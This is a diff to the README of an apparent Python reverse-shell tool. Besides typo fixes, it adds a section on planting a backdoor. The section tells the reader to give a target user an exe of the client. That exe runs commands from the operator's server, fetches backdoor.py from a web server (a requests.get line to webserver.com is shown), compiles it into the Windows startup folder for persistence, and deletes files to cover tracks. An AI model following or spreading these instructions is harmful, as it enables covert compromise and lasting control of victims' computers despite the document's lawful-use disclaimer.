@@ -13,7 +13,7 @@ Disclaimer: This reverse shell should only be used in the lawful, remote adminis
 Type in the command line `pip install -r requirements.txt` to install all required modules
 ***
 ## How to use
-Make sure that you have port forwading on port 42424 (you can change it if you want) to your computer.
+Make sure that you have port forwarding on port 42424 (you can change it if you want) to your computer.
 Also make sure that you enable the port on your local firewall (inbound and outbound)
 ***
 ## Client
@@ -29,7 +29,7 @@ Start **server.py** using the following command:
 `python3 server.py`
 and wait for connection.
 
-To see of all your connections type `snake> list` in the interacive prompt.
+To see of all your connections type `snake> list` in the interactive prompt.
 
 To send commands to one of your connections type `select` and the ID number of the connection.
 
@@ -45,5 +45,22 @@ If you want to quit from your connection, type `quit` and then you'll be back in
 
 If you want to quit from the entire program type `shutdown` in the interactive prompt.
 ***
+# Backdoor
+If you want to plant also a backdoor give the user an exe version of the **client.py** from the folder **"Multi client and backdoor"**.
+
+Upload the file **backdoor.py** to a server that you do a GET request to and change the address in **client.py** from 
+`request = requests.get("http://webserver.com/backdoor.py")` to
+`request = requests.get("%YOUR WEB SERVER ADDRESS%")`
+## how the backdoor works
+When the user open the program (exe version of **client.py**) the program will have 3 processes:
+* The main process - The GUI
+* The commands process - connects to the server and executes commands
+* The backdoor process - get the code from the webserver and creates an exe version of it and saves it the startup folder (only from Windows machines for now)
+What the backdoor process is exactly doing is, it saves the code from the webserver and saves on a file names **temp.py** (the file will be automatically removed), then a the process executes a pyinstaller command which creates an exe version of the backdoor in the startup folder which will make start automatically every time the machine starts and removes all unnecessary folders and files to cover tracks.
+
+To change the name of the backdoor file find this line:
+`name = "backdoor"  # Here you can change the name of the backdoor app` 
+and change the value to the name you want
+***
 ## Collaboration
-If you want to collaborate with me about this project or about any other project, contect me on **ofer026@gmail.com**
+If you want to collaborate with me about this project or about any other project, contact me on **ofer026@gmail.com**
